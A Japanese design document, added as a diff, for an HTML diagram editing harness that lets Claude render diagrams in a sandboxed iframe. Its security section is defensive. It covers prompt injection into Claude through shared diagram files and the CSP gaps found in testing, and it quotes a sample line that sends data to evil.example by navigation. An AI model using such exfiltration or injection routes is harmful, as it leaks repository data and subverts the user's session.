@@ -1,0 +1,283 @@
+# HTML 図解ハーネス
+
+> ステータス: 確定 / 2026-07-20 / herdr セッションの設計議論に、feat/diagram-canvas 側での実測と判断を反映
+> ユーザー確定事項: Excalidraw は廃止する
+
+## 0. これは何か
+
+feat/diagram-canvas（Phase A: `board_write` と per-session MCP 注入、実装完了）の次の一手を定義する。
+Phase A で作った MCP 基盤は引き継ぎ、描画先を Excalidraw の scene から「意味モデルと Claude 生成 HTML 投影」へ差し替える。
+
+初版は提案として書かれ、7 件の未決事項を残していた。
+本版では 5 件の判断を確定させ（§4）、残る未決事項を 5 件に整理し（§9）、資産の見積もりを実装 surface の実測値で置き換えている。
+
+## 1. なぜ方針転換か
+
+図の目的は「お絵かき」ではなく、Claude とのやり取りの媒体である。
+第一ユースケースは、コードベースを読んでドメインモデリングを図解し、設計を図の上で練って会話へ戻すことにある（具体例: promarche の購買フロー設計）。
+
+Excalidraw ではこれが成立しない。
+
+- ドメインモデルや ER に必要な「行を持つ表」の shape がない。属性を 1 行足すだけで図形の手組み直しになる
+- カーディナリティ記法（crow's foot）がない
+- `mermaid-to-excalidraw` は erDiagram に対応せず、画像へフォールバックする。画像は編集できないため、ER では図を直して会話へ戻すループが構造的に閉じない
+
+scene JSON と座標は、対話の言語としては情報密度が低すぎる。
+Phase A の `board_write` 簡略スキーマも Claude に x/y を計算させており、同じ問題を抱えている。
+
+この 2 点は本セッションで実地に確認した。
+`mermaid-to-board.ts:86-119` は未対応図種を base64 SVG の画像要素へ落としており、ER の還流が閉じないことはコード上の事実である。
+また ER 図を `board_write` で描いた際、14 要素の座標と間隔をすべて手で決めており、図の意味を理解していても座標を介してしか表現できない状態になっていた。
+
+レイテンシの制約もある。
+図の編集を Claude への依頼で行うと会話ターンが長すぎて実用にならない。
+編集はユーザーがその場で完結でき、Claude は編集結果を見て考える側に回る必要がある。
+
+## 2. 4 原則
+
+1. **図は意味モデルの投影**：Claude には座標も DOM も見せない。やり取りは意味モデルの差分（「決済ステップを承認の前に移動」「Order に cancelled_at を追加」）で行う
+2. **ファイルが正**：図は worktree 内のファイルとする。Claude は Read/Edit で直接読み書きし、git が履歴を持ち、fs.watch で UI へ再投影する。JSONL 原則（表示状態を情報源にしない）を図に適用したものである
+3. **編集はハーネスが保証**：編集能力を生成物の出来や会話に依存させない。GUI の直接操作、モデルテキストの直編集、会話の 3 経路が同一のモデルに収束する
+4. **表現は Claude が生成**：mermaid の図種語彙に縛られず、問題ごとに適した視覚表現（スイムレーン、状態機械、エンティティ表など）を HTML で生成する
+
+## 3. 3 層アーキテクチャ
+
+```
+[意味モデル] <worktree>/docs/diagrams/*.diagram.html に埋め込み
+     ↕ Claude: Read/Edit で直接読み書き / fs.watch で UI 再投影
+[投影 HTML]  sandbox iframe ペイン (HtmlViewerPane 系を土台にする)
+     ↕ MessageChannel ブリッジ
+[Ark server] 意味差分を整形 → 既存 session:send (tmux) で会話へ還流
+```
+
+**L1 編集ハーネス**：手組みで 1 回だけ作る、全図共通の JS ライブラリ。
+`data-model-id` で DOM 要素をモデルに束縛し、汎用の編集プリミティブを提供する。
+ドラッグによる並べ替えと付け替え、ダブルクリックのインライン編集（DOM なので IME がそのまま動く）、ノードの追加と複製と削除、接続の張り替え、undo/redo、「変更を送る」。
+加えてモデルを直接編集するテキストトグルを持つ。
+編集の大半をハーネス側で完結させ、会話ターンを消費しないことが狙いである。
+
+**L2 生成規約**：skill として Claude に配布する。
+Claude が書くのはモデル schema と投影（レンダリング）だけとし、編集ロジックは書かせない。
+ハーネスが理解できるレイアウトコンテナ（list / grid / graph）の上に描くことが、編集可能性の担保になる。
+表現の自由はコンテナ内のスタイリングで確保する。
+
+**L3 会話**：意味差分のレビュー、コードとの同期、図の再構成に使う。
+
+## 4. 確定した判断
+
+### 4.1 図ファイルの置き場所
+
+`<worktree>/docs/diagrams/*.diagram.html` に置き、git の管理下とする。
+
+リポジトリ外（Ark 管理領域）に置く案は退けた。
+Claude Code のセッションは worktree に根を張っており、外を読み書きするには `--add-dir` が要る。
+これは起動時に固定されるため（CLAUDE.md の C-B1）、新しい図のディレクトリを作っても会話を貼り直すまで Claude から見えない。
+
+この判断により、Ark はユーザーのリポジトリにファイルを書くツールになる。
+客先リポジトリでは図が `git status` に現れ、PR に混ざる。
+利用者が望まない場合は gitignore で対処する。
+
+### 4.2 生成 HTML の信頼境界
+
+`<script>` を許可し、CSP で外部通信を遮断し、橋渡しは MessageChannel の能力ベースで行う。
+還流する文面はサーバーが生成する。
+
+`HtmlViewerPane.tsx:158` は `sandbox="allow-scripts"` を使い `allow-same-origin` を付けていないため、iframe は不透明オリジンになる。
+ここから来る postMessage は `event.origin` が `"null"` になり、オリジンによる送信元認証ができない。
+`allow-same-origin` を足すと生成コードが親に到達できてサンドボックスが無意味になるため、不透明オリジンを保ったまま、ロード時に MessageChannel の port を転送する形を取る。
+
+還流の文面をサーバーが組む理由は、`session:send` が tmux に直結していることにある。
+iframe が送った文面をそのまま流すと、生成コードや、他人が書いて PR で入ってきた `.diagram.html` が Claude へのプロンプト注入口になる。
+図はリポジトリのファイルとして共有される前提（4.1）なので、この経路は塞いでおく。
+iframe からは構造化されたモデルだけを受け取り、サーバーが旧モデルと突き合わせて文を組み立てる。
+
+L2 の「編集ロジックは書かせない」は規約であり、境界ではない。
+LLM に渡す規約は守られる保証がないため、注入の防止はサーバー側の文面生成で担保する。
+
+#### 4.2.1 実測による訂正（2026-07-20 スパイク）
+
+`HtmlViewerPane` と同じ条件（`srcDoc` + `sandbox="allow-scripts"`）を再現して 7 項目を実測した。
+6 項目は前提どおりだったが、外部通信の遮断だけが成立していなかった。
+
+| 項目 | 前提 | 実測 |
+| --- | --- | --- |
+| sandbox 内の script 実行 | 動く | 動いた |
+| origin | `"null"`（不透明） | `window.origin = null` |
+| 親への postMessage | 既存リスナーの origin 検査で弾かれる | 親は受信したが `origin: "null"` |
+| 外部通信 | CSP で遮断される | **遮断されず、外部 fetch が成功した** |
+| localStorage | 使えない | `SecurityError` |
+| MessageChannel | 使える | 使える |
+| IME | DOM なのでネイティブに動く | 問題なし（実機確認） |
+
+外部通信が遮断されない理由は配信方式にある。
+`HtmlViewerPane` は `/api/html-file` を fetch して `srcDoc` に流し込むため（`HtmlViewerPane.tsx:34,156`）、
+サーバーが付けている `Content-Security-Policy: sandbox allow-scripts`（`index.ts:1150`）は srcDoc 文書には適用されない。
+srcDoc 文書は埋め込み側の CSP を継承する。
+実際に効いているのは iframe の `sandbox` 属性だけであり、これはネットワークを制限しない。
+
+このまま実装すると、Claude が生成した JS がリポジトリの内容を外部へ送信できる。
+図はリポジトリ経由で共有される前提（4.1）なので、他人が書いた `.diagram.html` も同じ経路を持つ。
+
+遮断手段は実測で確定した。srcDoc の中身に meta CSP を注入する。
+
+```html
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:;">
+```
+
+この指定で外部 fetch は `Failed to fetch` で遮断され、インライン script とインライン style は動作を続けることを確認した。
+meta の注入は Ark 側が行う（生成物に書かせると、書かなければ無効になる）。
+
+#### 4.2.2 meta CSP で止まらないもの（B-0a 最終レビューでの指摘）
+
+「外部通信の遮断は meta CSP が担う」という 4.2 の記述は不正確である。
+CSP が止めるのはサブリソースの取得であり、**文書自身のナビゲーションは止められない**。
+`location.href = "https://evil.example/?d=..."` や `<a href>` のクリックを禁じるディレクティブは存在しない（`navigate-to` は廃案）。
+
+被害の範囲は次の理由でペイン内に限られる。
+
+- iframe の sandbox に `allow-top-navigation` / `allow-popups` / `allow-forms` を付けていないため、親ウィンドウの遷移・別窓・フォーム送信はできない
+- 不透明オリジンのため親 DOM にも触れない
+
+残るリスクは 2 つある。
+
+- ペイン内に攻撃者のページを描画できる（そのページは自前オリジンなので CSP の制約を受けず、入力を送信できる）。フィッシング面になる
+- ナビゲーション自体がビーコンとして機能する（誰がいつその図を開いたかが外部に伝わる）
+
+図がリポジトリ経由で共有される前提（4.1）である以上、他人が書いた `.diagram.html` もこの経路を持つ。
+B-0b で MessageChannel を入れる際に、ペイン側でナビゲーションを検知して遮断するかを決める。
+
+### 4.3 モデルの意味語彙
+
+コア語彙（node / edge / field / group と label の規約）だけ標準化し、図種固有の意味は拡張フィールドに逃がす。
+
+4.2 で還流文をサーバーが組むと決めたため、サーバーがモデルの構造を理解できる必要が生じた。
+モデルが完全な自由形式だと、サーバーに書けるのは「`$.entities[0].fields[3]` が追加された」程度の機械的な差分になり、原則 1 が求める「Order に cancelled_at を追加」にならない。
+一方で図種ごとに schema を定義すると、図種を増やすたびに実装が必要になり原則 4 と衝突する。
+コア語彙だけを固定すれば、図種の追加は skill の更新だけで済み、サーバーは「あるノードにあるフィールドが増えた」までは確実に書ける。
+
+初版の L2 が縛っていた list / grid / graph はレイアウトの語彙であり、意味の語彙ではない。
+両方が要る。
+
+### 4.4 B-0 の実装範囲
+
+list コンテナ 1 種、インライン編集、行の並べ替えと追加と削除、「変更を送る」、モデル直編集トグルまでとする。
+undo/redo、graph コンテナ、自動レイアウト、接続の張り替えは後段に送る。
+
+行の追加と削除を含めた理由は、受け入れシナリオが属性の編集を含み、原則 1 の例自体が「Order に cancelled_at を追加」だからである。
+undo/redo を送れる理由は、ファイルが git の管理下にあり、モデル直編集の逃げ道もあるためである。
+
+### 4.5 移行の進め方
+
+B-0 の完了と同時に Excalidraw を撤去する。
+段階的な共存は取らない。
+
+この判断は、次節に挙げる機能の喪失を受け入れることを意味する。
+
+## 5. Phase A 資産の引き継ぎと廃棄
+
+Phase A のボード関連は実装 約 2,995 行、テスト 約 879 行（60 件）である。
+
+### 5.1 引き継ぐもの（約 836 行）
+
+| 対象 | 行数 |
+| --- | --- |
+| `BoardMcpServer` の HTTP / registry / 認証（ツール定義を除く） | 245 |
+| `session-orchestrator` の board 配線と `append-system-prompt` | 77 |
+| `managed-worktree.ts` | 155 |
+| `HtmlViewerPane` / `html-path-validator` / `html-screenshotter` | 359 |
+
+`BoardMcpServer` は token から worktree を解決する registry、`--mcp-config` 注入、ポート永続化、認証ミドルウェアからなり、ツールの中身を差し替えるだけで再利用できる。
+
+`managed-worktree.ts` は本日の修正で新設した worktree 検証の共通基盤である。
+canvas 系だけでなくプロファイル紐付けからも使われるため、Excalidraw の撤去後も残る。
+
+コミット `9d4a4bc`（board token のライフサイクル修正、worktree 検証の診断可能化、再起動時のトークン復帰）は、すべてこの引き継ぎ層にある。
+Excalidraw 固有の codec には触れていないため、方針転換後もそのまま生きる。
+
+### 5.2 廃棄するもの（実装 約 1,624 行、テスト 約 340 行）
+
+| 対象 | 実装 | テスト |
+| --- | ---: | ---: |
+| `CanvasPane.tsx`（Excalidraw 本体） | 550 | 0 |
+| `canvas:*` ハンドラと `canvas_boards` テーブル | 337 | 191 |
+| `board-element-codec.ts` | 281 | 149 |
+| `mermaid-to-board.ts` / `board-bus.ts` / `canvas-tabs.ts` | 289 | 0 |
+| `canvas-diff-utils.ts` | 167 | 0 |
+
+依存としては `@excalidraw/excalidraw` と `@excalidraw/mermaid-to-excalidraw` を削除する。
+どちらも `packages/web` だけが宣言しており、実装コードからの import は `CanvasPane.tsx:41-42` と `mermaid-to-board.ts:30-34` の 2 箇所しかない。
+
+`SplitViewPane.tsx` と `MermaidBlock.tsx` は改修して残す。
+
+初版は `canvas:updated` の room 配線を「モデルファイル更新通知に転用」として引き継ぎ側に置いていた。
+実際に残るのは room への配信そのもの（十数行）だけである。
+`canvas:load` / `canvas:save` の CAS（楽観ロック）、`canvas_boards` テーブル、そのテストは、原則 2 でファイルを正とする以上すべて不要になる。
+
+`canvas-diff-utils.ts` の `buildBoardDiffText` は、要素の差分を自然文へ変換する処理である。
+コードは Excalidraw の要素構造に依存しているため捨てるが、解いていた問題は 4.2 のサーバー側文面生成として戻ってくる。
+実装時に参照する価値がある。
+
+## 6. MCP ツールの再定義
+
+ファイルが正になるため、Claude は Write/Edit で図ファイルを直接書くのが基本経路になる。
+MCP には軽い口だけ残す。
+
+- `board_open(path)`：ボードペインで指定の図を開かせる
+
+更新の検知は fs.watch で足りるため、通知ツールは置かない。
+還流はハーネス側が担う（「変更を送る」→ MessageChannel → server → 意味差分の整形 → `session:send`）。
+
+B-0 では `board_open` を作る。
+ただしこのツールを残し続けるかには検討の余地がある。
+fs.watch による自動オープンでも代替でき、その場合は `BoardMcpServer` ごと退役できるためである。
+明示的な意図表明（MCP）と副作用の少なさ（watch）のどちらを取るかは、B-0 で実際に使ってから B-2 で判断する。
+
+本セッションでは、この判断材料になる事象が起きた。
+生成した HTML のパスをチャットに書いても、リンクにならず開けなかった。
+`ark:open-file` を発行しているのは `useTerminalLinkInjection.ts`（ttyd iframe 内の xterm.js）だけで、チャットビューにリンク化の実装がないためである。
+Claude が生成した図をユーザーへ届ける経路は、現状ターミナルビュー経由しかない。
+
+## 7. 移行の段階
+
+| 段階 | 内容 | 出口条件 |
+| --- | --- | --- |
+| B-0 | 新ハーネス、L2 生成規約 skill、`board_open`、サーバー側の差分生成 | promarche 購買フローで受け入れシナリオが 1 周回る |
+| B-1 | Excalidraw の撤去（依存、`CanvasPane`、codec、`canvas:*`、`canvas_boards`、mermaid 導線）。4.5 により B-0 完了の直後に実施し、共存期間を置かない | 実装 約 1,624 行とテスト 約 340 行の削除 |
+| B-2 | graph コンテナ、自動レイアウト（elkjs 候補）、undo/redo、接続の張り替え | |
+
+## 8. 受け入れた機能の喪失
+
+4.5 により、B-1 の時点で次が失われる。
+B-0 の list コンテナと行編集では代替できない。
+
+| 失われるもの | 実使用だと判断した根拠 |
+| --- | --- |
+| 画像の貼り付け | `index.ts:805-816` に、人間が貼った埋め込み画像を引き継ぐ処理が明示的に置かれている |
+| 自由図形と自由描画 | `board_write` の rect / ellipse / diamond / arrow と手描き |
+| mermaid の対応図種 | flowchart 等は変換が効いており現状は実用。画像フォールバックに落ちるのは ER のみ |
+
+## 9. 残る未決事項
+
+B-0 の実装計画で詰める。
+
+1. 生成規約 skill の具体（コア語彙をどう提示し、コンテナの使い方をどう教えるか）
+2. 意味差分から文を組み立てる規則
+3. 還流の発火 UX。既定は明示的な「変更を送る」ボタンとし、ファイル保存は編集のたびのデバウンスで分離する
+4. モバイル対応の範囲。B-0 は閲覧のみとする
+5. graph コンテナに自動レイアウト（elkjs 等）を同梱するか。B-2 の論点
+
+## 10. 受け入れシナリオ
+
+promarche のセッションで「購買フローをドメインモデリングして図解して」と依頼する。
+
+1. Claude がコードを読み `docs/diagrams/purchase-flow.diagram.html` を生成する
+2. Ark のボードペインに編集可能な状態で表示される
+3. ユーザーがエンティティの属性とフローの順序を直接編集する（Claude を待たない）
+4. 「変更を送る」を押すと、Claude が意味差分を受けて設計の議論を続け、必要ならファイルを Edit で更新する
+
+## 付記: 本ファイルの扱い
+
+初版には「project 規約により git にコミットしない」と書かれていたが、CLAUDE.md の規約はその逆である。
+「superpowers スキルが生成する plan/spec ファイルは成果物としてコミットし、作業の PR に含める」と明記されている。
+Excalidraw 廃止という確定判断の経緯を git に残す必要もあるため、本ファイルはコミットする。
